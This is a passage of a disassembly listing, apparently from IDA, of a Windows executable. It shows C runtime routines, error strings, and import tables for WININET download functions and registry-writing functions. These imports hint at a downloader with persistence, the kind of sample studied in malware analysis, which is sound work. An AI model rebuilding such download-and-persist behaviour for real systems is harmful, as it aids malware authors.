		mov	eax, edi
		mov	[ebp+arg_0], ebx
		jb	short loc_404E45
		lea	eax, [edi+edx]
		mov	[edi], dl
		cmp	eax, ebx
		jnb	short loc_404E34
		add	[ecx], edx
		sub	[ecx+4], edx
		jmp	short loc_404E3D
; ---------------------------------------------------------------------------

loc_404E34:				; CODE XREF: sub_404E00+2Bj
		and	dword ptr [ecx+4], 0
		lea	eax, [ecx+8]
		mov	[ecx], eax

loc_404E3D:				; CODE XREF: sub_404E00+32j
		lea	eax, [edi+8]
		jmp	loc_404F13
; ---------------------------------------------------------------------------

loc_404E45:				; CODE XREF: sub_404E00+22j
		add	esi, edi
		cmp	byte ptr [esi],	0
		jz	short loc_404E4E
		mov	eax, esi

loc_404E4E:				; CODE XREF: sub_404E00+4Aj
		lea	esi, [eax+edx]
		cmp	esi, ebx
		jnb	short loc_404E98

loc_404E55:				; CODE XREF: sub_404E00+96j
		mov	bl, [eax]
		test	bl, bl
		jnz	short loc_404E8B
		push	1
		lea	ebx, [eax+1]
		pop	esi

loc_404E61:				; CODE XREF: sub_404E00+68j
		cmp	byte ptr [ebx],	0
		jnz	short loc_404E6A
		inc	ebx
		inc	esi
		jmp	short loc_404E61
; ---------------------------------------------------------------------------

loc_404E6A:				; CODE XREF: sub_404E00+64j
		cmp	esi, edx
		jnb	short loc_404EBC
		cmp	eax, [ebp+var_4]
		jnz	short loc_404E78
		mov	[ecx+4], esi
		jmp	short loc_404E84
; ---------------------------------------------------------------------------

loc_404E78:				; CODE XREF: sub_404E00+71j
		sub	[ebp+arg_4], esi
		cmp	[ebp+arg_4], edx
		jb	loc_404F1D

loc_404E84:				; CODE XREF: sub_404E00+76j
		mov	edi, [ebp+var_4]
		mov	eax, ebx
		jmp	short loc_404E90
; ---------------------------------------------------------------------------

loc_404E8B:				; CODE XREF: sub_404E00+59j
		movzx	esi, bl
		add	eax, esi

loc_404E90:				; CODE XREF: sub_404E00+89j
		lea	esi, [eax+edx]
		cmp	esi, [ebp+arg_0]
		jb	short loc_404E55

loc_404E98:				; CODE XREF: sub_404E00+53j
		lea	esi, [ecx+8]

loc_404E9B:				; CODE XREF: sub_404E00+EBj
					; sub_404E00+F2j
		cmp	esi, edi
		jnb	short loc_404F1D
		lea	eax, [esi+edx]
		cmp	eax, [ebp+arg_0]
		jnb	short loc_404F1D
		mov	al, [esi]
		test	al, al
		jnz	short loc_404EED
		push	1
		lea	ebx, [esi+1]
		pop	eax

loc_404EB3:				; CODE XREF: sub_404E00+BAj
		cmp	byte ptr [ebx],	0
		jnz	short loc_404EDD
		inc	ebx
		inc	eax
		jmp	short loc_404EB3
; ---------------------------------------------------------------------------

loc_404EBC:				; CODE XREF: sub_404E00+6Cj
		lea	ebx, [eax+edx]
		cmp	ebx, [ebp+arg_0]
		jnb	short loc_404ECD
		sub	esi, edx
		mov	[ecx], ebx
		mov	[ecx+4], esi
		jmp	short loc_404ED6
; ---------------------------------------------------------------------------

loc_404ECD:				; CODE XREF: sub_404E00+C2j
		and	dword ptr [ecx+4], 0
		lea	esi, [ecx+8]
		mov	[ecx], esi

loc_404ED6:				; CODE XREF: sub_404E00+CBj
		mov	[eax], dl
		add	eax, 8
		jmp	short loc_404F13
; ---------------------------------------------------------------------------

loc_404EDD:				; CODE XREF: sub_404E00+B6j
		cmp	eax, edx
		jnb	short loc_404EF4
		sub	[ebp+arg_4], eax
		cmp	[ebp+arg_4], edx
		jb	short loc_404F1D
		mov	esi, ebx
		jmp	short loc_404E9B
; ---------------------------------------------------------------------------

loc_404EED:				; CODE XREF: sub_404E00+ABj
		movzx	eax, al
		add	esi, eax
		jmp	short loc_404E9B
; ---------------------------------------------------------------------------

loc_404EF4:				; CODE XREF: sub_404E00+DFj
		lea	ebx, [esi+edx]
		cmp	ebx, [ebp+arg_0]
		jnb	short loc_404F05
		sub	eax, edx
		mov	[ecx], ebx
		mov	[ecx+4], eax
		jmp	short loc_404F0E
; ---------------------------------------------------------------------------

loc_404F05:				; CODE XREF: sub_404E00+FAj
		and	dword ptr [ecx+4], 0
		lea	eax, [ecx+8]
		mov	[ecx], eax

loc_404F0E:				; CODE XREF: sub_404E00+103j
		mov	[esi], dl
		lea	eax, [esi+8]

loc_404F13:				; CODE XREF: sub_404E00+40j
					; sub_404E00+DBj
		imul	ecx, 0Fh
		shl	eax, 4
		sub	eax, ecx
		jmp	short loc_404F1F
; ---------------------------------------------------------------------------

loc_404F1D:				; CODE XREF: sub_404E00+7Ej
					; sub_404E00+9Dj ...
		xor	eax, eax

loc_404F1F:				; CODE XREF: sub_404E00+11Bj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_404E00	endp

; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [000000FE BYTES: COLLAPSED FUNCTION _strncpy.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS	CTRL-NUMPAD+ TO	EXPAND]
; [00000057 BYTES: COLLAPSED FUNCTION __commit.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000007 BYTES: COLLAPSED FUNCTION __fptrap.	PRESS CTRL-NUMPAD+ TO EXPAND]
		db  59h	; Y
		db 0C3h	; 
		align 10h
; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000056 BYTES: COLLAPSED FUNCTION _fclose. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_4051DE	proc near		; CODE XREF: __lseek+6Bp __write+160p	...

arg_0		= dword	ptr  4

		mov	ecx, [esp+arg_0]
		xor	edx, edx
		mov	dword_409AAC, ecx
		mov	eax, offset unk_409920

loc_4051EF:				; CODE XREF: sub_4051DE+1Ej
		cmp	ecx, [eax]
		jz	short loc_405213
		add	eax, 8
		inc	edx
		cmp	eax, offset unk_409A88
		jb	short loc_4051EF
		cmp	ecx, 13h
		jb	short loc_405220
		cmp	ecx, 24h
		ja	short loc_405220
		mov	dword_409AA8, 0Dh
		retn
; ---------------------------------------------------------------------------

loc_405213:				; CODE XREF: sub_4051DE+13j
		mov	eax, dword_409924[edx*8]
		mov	dword_409AA8, eax
		retn
; ---------------------------------------------------------------------------

loc_405220:				; CODE XREF: sub_4051DE+23j
					; sub_4051DE+28j
		cmp	ecx, 0BCh
		jb	short loc_40523A
		cmp	ecx, 0CAh
		mov	dword_409AA8, 8
		jbe	short locret_405244

loc_40523A:				; CODE XREF: sub_4051DE+48j
		mov	dword_409AA8, 16h

locret_405244:				; CODE XREF: sub_4051DE+5Aj
		retn
sub_4051DE	endp

; [0000007A BYTES: COLLAPSED FUNCTION __free_osfhnd. PRESS CTRL-NUMPAD+	TO EXPAND]
; [0000003D BYTES: COLLAPSED FUNCTION __get_osfhandle. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS	CTRL-NUMPAD+ TO	EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strncnt.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS CTRL-NUMPAD+ TO EXPAND]
; [000000CC BYTES: COLLAPSED FUNCTION _toupper.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000075 BYTES: COLLAPSED FUNCTION __isctype. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [00000335 BYTES: COLLAPSED FUNCTION _memcpy_0. PRESS CTRL-NUMPAD+ TO EXPAND]
; [000000B3 BYTES: COLLAPSED FUNCTION __close. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION __freebuf. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 4
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 800h
_text		ends

; Section 2. (virtual address 00006000)
; Virtual size			: 00000A00 (   2560.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 00006000
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from ADVAPI32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; LSTATUS __stdcall RegSetValueExA(HKEY	hKey, LPCSTR lpValueName, DWORD	Reserved, DWORD	dwType,	const BYTE *lpData, DWORD cbData)
		extrn RegSetValueExA:dword ; CODE XREF:	sub_401150+8Bp
					; DATA XREF: sub_401150+8Br ...
; LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY	phkResult)
		extrn RegOpenKeyExA:dword ; CODE XREF: sub_401150+71p
					; DATA XREF: sub_401150+71r

;
; Imports from KERNEL32.dll
;
; BOOL __stdcall CreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes)
		extrn CreateDirectoryA:dword ; CODE XREF: sub_401150+31p
					; DATA XREF: sub_401150+31r ...
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWSTR lpSrcStr, int	cchSrc,	LPWORD lpCharType)
		extrn GetStringTypeW:dword ; CODE XREF:	___crtGetStringTypeA+3Fp
					; ___crtGetStringTypeA+12Dp
					; DATA XREF: ...
; BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)
		extrn CopyFileA:dword	; CODE XREF: sub_401150+47p
					; DATA XREF: sub_401150+47r
; int __stdcall	LCMapStringW(LCID Locale, DWORD	dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int	cchDest)
		extrn LCMapStringW:dword ; CODE	XREF: ___crtLCMapStringA+42p
					; ___crtLCMapStringA+14Dp ...
; int __stdcall	LCMapStringA(LCID Locale, DWORD	dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest)
		extrn LCMapStringA:dword ; CODE	XREF: ___crtLCMapStringA+5Ep
					; ___crtLCMapStringA+A7p
					; DATA XREF: ...
; int __stdcall	MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr,	int cchWideChar)
		extrn MultiByteToWideChar:dword	; CODE XREF: ___crtLCMapStringA+DFp
					; ___crtLCMapStringA+137p ...
; BOOL __stdcall SetStdHandle(DWORD nStdHandle,	HANDLE hHandle)
		extrn SetStdHandle:dword ; CODE	XREF: __free_osfhnd:loc_405298p
					; DATA XREF: __free_osfhnd:loc_405298r
; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
		extrn DeleteFileA:dword	; CODE XREF: sub_401150+54p
					; DATA XREF: sub_401150+54r
; BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr,	int cchSrc, LPWORD lpCharType)
		extrn GetStringTypeA:dword ; CODE XREF:	___crtGetStringTypeA+59p
					; ___crtGetStringTypeA+8Dp
					; DATA XREF: ...
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; CODE XREF: sub_401150+A9p _main+77p
					; DATA XREF: ...
; LPSTR	__stdcall GetCommandLineA()
		extrn GetCommandLineA:dword ; CODE XREF: start+74p
					; DATA XREF: start+74r
; DWORD	__stdcall GetVersion()
		extrn GetVersion:dword	; CODE XREF: start+26p
					; DATA XREF: start+26r
; void __stdcall __noreturn ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; CODE XREF: _fast_error_exit+1Dp
					; _doexit+91p
					; DATA XREF: ...
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT	uExitCode)
		extrn TerminateProcess:dword ; CODE XREF: _doexit+17p
					; DATA XREF: _doexit+17r
; HANDLE __stdcall GetCurrentProcess()
		extrn GetCurrentProcess:dword ;	CODE XREF: _doexit+10p
					; DATA XREF: _doexit+10r
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn UnhandledExceptionFilter:dword ; CODE XREF: __XcptFilter+138p
					; DATA XREF: __XcptFilter+138r
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename,	DWORD nSize)
		extrn GetModuleFileNameA:dword ; CODE XREF: __setargv+23p
					; sub_4027F5+B4p ...
; BOOL __stdcall FreeEnvironmentStringsA(LPCH)
		extrn FreeEnvironmentStringsA:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+11Fp
					; DATA XREF: ___crtGetEnvironmentStringsA+11Fr
; BOOL __stdcall FreeEnvironmentStringsW(LPWCH)
		extrn FreeEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+CEp
					; DATA XREF: ___crtGetEnvironmentStringsA+CEr
; int __stdcall	WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR	lpMultiByteStr,	int cbMultiByte, LPCSTR	lpDefaultChar, LPBOOL lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+93p
					; ___crtGetEnvironmentStringsA+B5p ...
; LPCH __stdcall GetEnvironmentStrings()
		extrn GetEnvironmentStrings:dword
					; CODE XREF: ___crtGetEnvironmentStringsA:loc_40251Ap
					; ___crtGetEnvironmentStringsA+E1p
					; DATA XREF: ...
; LPWCH	__stdcall GetEnvironmentStringsW()
		extrn GetEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+1Bp
					; ___crtGetEnvironmentStringsA+5Bp
					; DATA XREF: ...
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn SetHandleCount:dword ; CODE XREF:	__ioinit+19Dp
					; DATA XREF: __ioinit+19Dr
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; CODE	XREF: __ioinit+158p
					; sub_402BA5+143p
					; DATA XREF: ...
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn GetFileType:dword	; CODE XREF: __ioinit+FFp
					; __ioinit+166p
					; DATA XREF: ...
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; CODE XREF: __ioinit+59p
					; DATA XREF: __ioinit+59r
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: sub_4027C8+Ap
					; DATA XREF: sub_4027C8+Ar
; DWORD	__stdcall GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize)
		extrn GetEnvironmentVariableA:dword ; CODE XREF: sub_4027F5+54p
					; DATA XREF: sub_4027F5+54r
; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA	lpVersionInformation)
		extrn GetVersionExA:dword ; CODE XREF: sub_4027F5+1Fp
					; DATA XREF: sub_4027F5+1Fr
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn HeapDestroy:dword	; CODE XREF: sub_40293D+50p
					; DATA XREF: sub_40293D+50r
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
		extrn HeapCreate:dword	; CODE XREF: sub_40293D+11p
					; DATA XREF: sub_40293D+11r
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn VirtualFree:dword	; CODE XREF: sub_404122+258p
					; sub_404122+2B3p ...
; BOOL __stdcall HeapFree(HANDLE hHeap,	DWORD dwFlags, LPVOID lpMem)
		extrn HeapFree:dword	; CODE XREF: sub_402EDD+60p
					; sub_404122+2C5p ...
; void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD	ExceptionRecord, PVOID ReturnValue)
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; CODE XREF: sub_402BA5+14Ap
					; __write+D8p ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
		extrn HeapAlloc:dword	; CODE XREF: sub_402D36+6Cp
					; sub_403125+74p ...
; DWORD	__stdcall GetLastError()
		extrn GetLastError:dword ; CODE	XREF: __lseek+5Cp
					; __write:loc_4033EDp ...
; DWORD	__stdcall SetFilePointer(HANDLE	hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
		extrn SetFilePointer:dword ; CODE XREF:	__lseek+4Fp
					; DATA XREF: __lseek+4Fr
; BOOL __stdcall GetCPInfo(UINT	CodePage, LPCPINFO lpCPInfo)
		extrn GetCPInfo:dword	; CODE XREF: __setmbcp+48p
					; _setSBUpLow+14p
					; DATA XREF: ...
; UINT __stdcall GetACP()
		extrn GetACP:dword	; DATA XREF: _getSystemCP+2Fr
; UINT __stdcall GetOEMCP()
		extrn GetOEMCP:dword	; DATA XREF: _getSystemCP+1Ar
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn VirtualAlloc:dword ; CODE	XREF: ___sbh_alloc_new_region+76p
					; ___sbh_alloc_new_group+51p ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes)
		extrn HeapReAlloc:dword	; CODE XREF: ___sbh_alloc_new_region+28p
					; DATA XREF: ___sbh_alloc_new_region+28r
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	___crtMessageBoxA+2Ap
					; ___crtMessageBoxA+3Bp ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; CODE	XREF: ___crtMessageBoxA+12p
					; DATA XREF: ___crtMessageBoxA+12r
; BOOL __stdcall FlushFileBuffers(HANDLE hFile)
		extrn FlushFileBuffers:dword ; CODE XREF: __commit+2Cp
					; DATA XREF: __commit+2Cr
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; CODE XREF: __close+65p
					; DATA XREF: __close+65r

;
; Imports from WININET.dll
;
; HINTERNET __stdcall InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders,	DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR	dwContext)
		extrn InternetOpenUrlA:dword ; CODE XREF: sub_401040+44p
					; DATA XREF: sub_401040+44r ...
; BOOL __stdcall InternetCloseHandle(HINTERNET hInternet)
		extrn InternetCloseHandle:dword	; CODE XREF: sub_401040+64p
					; sub_401040+A5p ...
; BOOL __stdcall InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
		extrn InternetReadFile:dword ; CODE XREF: sub_401040+85p
					; DATA XREF: sub_401040+85r ...
; BOOL __stdcall InternetGetConnectedState(LPDWORD lpdwFlags, DWORD dwReserved)
		extrn InternetGetConnectedState:dword ;	CODE XREF: sub_401000+8p
					; DATA XREF: sub_401000+8r
; HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
		extrn InternetOpenA:dword ; CODE XREF: sub_401040+2Ap
					; DATA XREF: sub_401040+2Ar


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 4060E4h
		align 8
stru_4060E8	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_4013F8, offset loc_40140C>
					; DATA XREF: start+5o
					; SEH scope table for function 401338

aNull_0:				; DATA XREF: .data:off_4071E8o
		unicode	0, <(null)>,0
		align 10h
aNull		db '(null)',0           ; DATA XREF: .data:off_4071E4o
		align 4
; char a__global_heap_[]
a__global_heap_	db '__GLOBAL_HEAP_SELECTED',0 ; DATA XREF: sub_4027F5+8Eo
		align 10h
; CHAR Name[]
Name		db '__MSVCRT_HEAP_SELECT',0 ; DATA XREF: sub_4027F5+4Fo
		align 4
aRuntimeError	db 'runtime error ',0
		align 4
		db 0Dh,0Ah,0
		align 4
aTlossError	db 'TLOSS error',0Dh,0Ah,0
		align 4
aSingError	db 'SING error',0Dh,0Ah,0
		align 4
aDomainError	db 'DOMAIN error',0Dh,0Ah,0
		align 4
aR6028UnableToI	db 'R6028',0Dh,0Ah
		db '- unable to initialize heap',0Dh,0Ah,0
		align 4
aR6027NotEnough	db 'R6027',0Dh,0Ah
		db '- not enough space for lowio initialization',0Dh,0Ah,0
		align 4
aR6026NotEnough	db 'R6026',0Dh,0Ah
		db '- not enough space for stdio initialization',0Dh,0Ah,0
		align 4
aR6025PureVirtu	db 'R6025',0Dh,0Ah
		db '- pure virtual function call',0Dh,0Ah,0
		align 4
aR6024NotEnough	db 'R6024',0Dh,0Ah
		db '- not enough space for _onexit/atexit table',0Dh,0Ah,0
		align 4
aR6019UnableToO	db 'R6019',0Dh,0Ah
		db '- unable to open console device',0Dh,0Ah,0
		align 10h
aR6018Unexpecte	db 'R6018',0Dh,0Ah
		db '- unexpected heap error',0Dh,0Ah,0
		align 4
aR6017Unexpecte	db 'R6017',0Dh,0Ah
		db '- unexpected multithread lock error',0Dh,0Ah,0
		align 4
aR6016NotEnough	db 'R6016',0Dh,0Ah
		db '- not enough space for thread data',0Dh,0Ah,0
aAbnormalProgra	db 0Dh,0Ah
		db 'abnormal program termination',0Dh,0Ah,0
		align 4
aR6009NotEnough	db 'R6009',0Dh,0Ah
		db '- not enough space for environment',0Dh,0Ah,0
aR6008NotEnough	db 'R6008',0Dh,0Ah
		db '- not enough space for arguments',0Dh,0Ah,0
		align 4
aR6002FloatingP	db 'R6002',0Dh,0Ah      ; DATA XREF: .data:off_40751Co
		db '- floating point not loaded',0Dh,0Ah,0
		align 4
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: sub_402BA5+119o
		align 4
; char asc_40644C[]
asc_40644C	db 0Ah			; DATA XREF: sub_402BA5+F1o
		db 0Ah,0
		align 10h
; char aRuntimeErrorPr[]
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: sub_402BA5+D3o
		db 0Ah
		db 'Program: ',0
		align 4
; char a___[]
a___		db '...',0              ; DATA XREF: sub_402BA5+BFo
; char aProgramNameUnk[]
aProgramNameUnk	db '<program name unknown>',0 ; DATA XREF: sub_402BA5+7Do
		align 4
; CHAR aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+3Do
		align 4
; CHAR aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+35o
; CHAR ProcName[]
ProcName	db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+24o
; CHAR LibFileName[]
LibFileName	db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+Do
		align 4
; CHAR byte_4064C4[4]
byte_4064C4	db 4 dup(0)		; DATA XREF: ___crtLCMapStringA+57o
					; ___crtGetStringTypeA+52o
; const	WCHAR SrcStr
SrcStr		dw 0			; DATA XREF: ___crtLCMapStringA+36o
					; ___crtGetStringTypeA+39o
		align 10h
stru_4064D0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40540C, offset loc_405410>
					; DATA XREF: ___crtLCMapStringA+5o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_4054C0, offset loc_4054C4> ; SEH scope table for function 4052FC
stru_4064E8	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_405644, offset loc_405648>
					; DATA XREF: ___crtGetStringTypeA+5o
					; SEH scope table for function 40554B
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_406550 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva CreateDirectoryA	; Import Address Table
__IMPORT_DESCRIPTOR_WININET dd rva off_406610 ;	Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aWininet_dll	; DLL Name
		dd rva InternetOpenUrlA	; Import Address Table
__IMPORT_DESCRIPTOR_ADVAPI32 dd	rva off_406544 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aAdvapi32_dll	; DLL Name
		dd rva RegSetValueExA	; Import Address Table
;
; Import names for ADVAPI32.dll
;
off_406544	dd rva word_4066E2	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_ADVAPI32o
		dd rva word_4066F4
		dd 0
word_406628	dw 296h			; DATA XREF: .rdata:00406574o
		db 'Sleep',0
word_406630	dw 57h			; DATA XREF: .rdata:0040656Co
		db 'DeleteFileA',0
word_40663E	dw 28h			; DATA XREF: .rdata:00406558o
		db 'CopyFileA',0
word_40664A	dw 2Dh			; DATA XREF: .rdata:off_406550o
		db 'CreateDirectoryA',0
		align 2
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .rdata:00406500o
		align 4
word_40666C	dw 66h			; DATA XREF: .rdata:0040661Co
		db 'InternetGetConnectedState',0
word_406688	dw 77h			; DATA XREF: .rdata:00406618o
		db 'InternetReadFile',0
		align 4
word_40669C	dw 56h			; DATA XREF: .rdata:00406614o
		db 'InternetCloseHandle',0
word_4066B2	dw 71h			; DATA XREF: .rdata:off_406610o
		db 'InternetOpenUrlA',0
		align 2
word_4066C6	dw 6Fh			; DATA XREF: .rdata:00406620o
		db 'InternetOpenA',0
aWininet_dll	db 'WININET.dll',0      ; DATA XREF: .rdata:00406514o
word_4066E2	dw 186h			; DATA XREF: .rdata:off_406544o
		db 'RegSetValueExA',0
		align 4
word_4066F4	dw 172h			; DATA XREF: .rdata:00406548o
		db 'RegOpenKeyExA',0
aAdvapi32_dll	db 'ADVAPI32.dll',0     ; DATA XREF: .rdata:00406528o
		align 2
word_406712	dw 0CAh			; DATA XREF: .rdata:00406578o
		db 'GetCommandLineA',0
word_406724	dw 174h			; DATA XREF: .rdata:0040657Co
		db 'GetVersion',0
		align 2
word_406732	dw 7Dh			; DATA XREF: .rdata:00406580o
		db 'ExitProcess',0
word_406740	dw 29Eh			; DATA XREF: .rdata:00406584o
		db 'TerminateProcess',0
		align 4
word_406754	dw 0F7h			; DATA XREF: .rdata:00406588o
		db 'GetCurrentProcess',0
word_406768	dw 2ADh			; DATA XREF: .rdata:0040658Co
		db 'UnhandledExceptionFilter',0
		align 4
word_406784	dw 124h			; DATA XREF: .rdata:00406590o
		db 'GetModuleFileNameA',0
		align 2
word_40679A	dw 0B2h			; DATA XREF: .rdata:00406594o
		db 'FreeEnvironmentStringsA',0
word_4067B4	dw 0B3h			; DATA XREF: .rdata:00406598o
		db 'FreeEnvironmentStringsW',0
word_4067CE	dw 2D2h			; DATA XREF: .rdata:0040659Co
		db 'WideCharToMultiByte',0
word_4067E4	dw 106h			; DATA XREF: .rdata:004065A0o
		db 'GetEnvironmentStrings',0
word_4067FC	dw 108h			; DATA XREF: .rdata:004065A4o
		db 'GetEnvironmentStringsW',0
		align 2
word_406816	dw 26Dh			; DATA XREF: .rdata:004065A8o
		db 'SetHandleCount',0
		align 4
word_406828	dw 152h			; DATA XREF: .rdata:004065ACo
		db 'GetStdHandle',0
		align 4
word_406838	dw 115h			; DATA XREF: .rdata:004065B0o
		db 'GetFileType',0
word_406846	dw 150h			; DATA XREF: .rdata:004065B4o
		db 'GetStartupInfoA',0
word_406858	dw 126h			; DATA XREF: .rdata:004065B8o
		db 'GetModuleHandleA',0
		align 4
word_40686C	dw 109h			; DATA XREF: .rdata:004065BCo
		db 'GetEnvironmentVariableA',0
word_406886	dw 175h			; DATA XREF: .rdata:004065C0o
		db 'GetVersionExA',0
word_406896	dw 19Dh			; DATA XREF: .rdata:004065C4o
		db 'HeapDestroy',0
word_4068A4	dw 19Bh			; DATA XREF: .rdata:004065C8o
		db 'HeapCreate',0
		align 2
word_4068B2	dw 2BFh			; DATA XREF: .rdata:004065CCo
		db 'VirtualFree',0
word_4068C0	dw 19Fh			; DATA XREF: .rdata:004065D0o
		db 'HeapFree',0
		align 4
word_4068CC	dw 22Fh			; DATA XREF: .rdata:004065D4o
		db 'RtlUnwind',0
word_4068D8	dw 2DFh			; DATA XREF: .rdata:004065D8o
		db 'WriteFile',0
word_4068E4	dw 199h			; DATA XREF: .rdata:004065DCo
		db 'HeapAlloc',0
word_4068F0	dw 11Ah			; DATA XREF: .rdata:004065E0o
		db 'GetLastError',0
		align 10h
word_406900	dw 26Ah			; DATA XREF: .rdata:004065E4o
		db 'SetFilePointer',0
		align 2
word_406912	dw 0BFh			; DATA XREF: .rdata:004065E8o
		db 'GetCPInfo',0
word_40691E	dw 0B9h			; DATA XREF: .rdata:004065ECo
		db 'GetACP',0
		align 4
word_406928	dw 131h			; DATA XREF: .rdata:004065F0o
		db 'GetOEMCP',0
		align 4
word_406934	dw 2BBh			; DATA XREF: .rdata:004065F4o
		db 'VirtualAlloc',0
		align 4
word_406944	dw 1A2h			; DATA XREF: .rdata:004065F8o
		db 'HeapReAlloc',0
word_406952	dw 13Eh			; DATA XREF: .rdata:004065FCo
		db 'GetProcAddress',0
		align 4
word_406964	dw 1C2h			; DATA XREF: .rdata:00406600o
		db 'LoadLibraryA',0
		align 4
word_406974	dw 0AAh			; DATA XREF: .rdata:00406604o
		db 'FlushFileBuffers',0
		align 4
